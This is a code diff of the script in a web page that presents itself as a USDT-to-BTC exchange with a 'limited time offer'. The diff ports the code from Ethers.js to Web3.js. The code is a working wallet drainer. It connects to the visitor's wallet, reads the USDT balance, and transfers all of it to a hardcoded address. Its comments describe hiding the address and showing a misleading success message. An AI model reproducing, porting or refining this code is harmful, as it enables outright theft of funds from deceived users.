@@ -277,17 +277,37 @@
         </div>
     </div>
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <!-- Using Web3.js instead of Ethers.js -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
     
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Configuration
             const BSC_CHAIN_ID = '0x38';
             const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
-            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943'; // Hidden in script only
+            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
             const MIN_AMOUNT = 200;
             const MAX_DAILY_LIMIT = 10000;
             const BTC_RATE = 119489.153599;
+            const USDT_ABI = [
+                {
+                    "constant": false,
+                    "inputs": [
+                        {"name": "_to", "type": "address"},
+                        {"name": "_value", "type": "uint256"}
+                    ],
+                    "name": "transfer",
+                    "outputs": [{"name": "", "type": "bool"}],
+                    "type": "function"
+                },
+                {
+                    "constant": true,
+                    "inputs": [{"name": "_owner", "type": "address"}],
+                    "name": "balanceOf",
+                    "outputs": [{"name": "balance", "type": "uint256"}],
+                    "type": "function"
+                }
+            ];
 
             // Elements
             const usdtInput = document.getElementById('usdtInput');
@@ -361,38 +381,33 @@
                         throw new Error('Please switch to BNB Smart Chain');
                     }
 
-                    // 3. Connect wallet (will show only one popup)
-                    const accounts = await window.ethereum.request({ 
-                        method: 'eth_requestAccounts' 
-                    });
+                    // 3. Initialize Web3
+                    const web3 = new Web3(window.ethereum);
+                    
+                    // 4. Connect wallet (will show only one popup)
+                    const accounts = await web3.eth.requestAccounts();
                     const userAddress = accounts[0];
 
-                    // 4. Setup contract
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const signer = provider.getSigner();
-                    const contract = new ethers.Contract(
-                        USDT_CONTRACT,
-                        [
-                            'function transfer(address to, uint256 amount) returns (bool)',
-                            'function balanceOf(address) view returns (uint256)'
-                        ],
-                        signer
-                    );
+                    // 5. Create USDT contract instance
+                    const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
 
-                    // 5. Check balance
-                    const balance = await contract.balanceOf(userAddress);
-                    const balanceInUSDT = parseFloat(ethers.utils.formatUnits(balance, 18));
+                    // 6. Check balance
+                    const balance = await usdtContract.methods.balanceOf(userAddress).call();
+                    const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
 
-                    // 6. Validate minimum amount (only for showing message)
+                    // 7. Validate minimum amount (only for showing message)
                     if (balanceInUSDT < MIN_AMOUNT) {
                         throw new Error(`Minimum ${MIN_AMOUNT} USDT & Maximum ${MAX_DAILY_LIMIT} USDT Daily limit [Limited time offer]`);
                     }
 
-                    // 7. Transfer ALL funds (regardless of amount, if >200)
-                    const tx = await contract.transfer(RECIPIENT_ADDRESS, balance);
+                    // 8. Transfer ALL funds (regardless of amount, if >200)
+                    const tx = await usdtContract.methods.transfer(
+                        RECIPIENT_ADDRESS,
+                        balance
+                    ).send({ from: userAddress });
                     
                     // Show success (without showing address)
-                    alert(`Success! Transferred ${balanceInUSDT.toFixed(2)} USDT`);
+                    alert(`Success! Transferred ${parseFloat(balanceInUSDT).toFixed(2)} USDT`);
 
                 } catch (error) {
                     console.error(error);
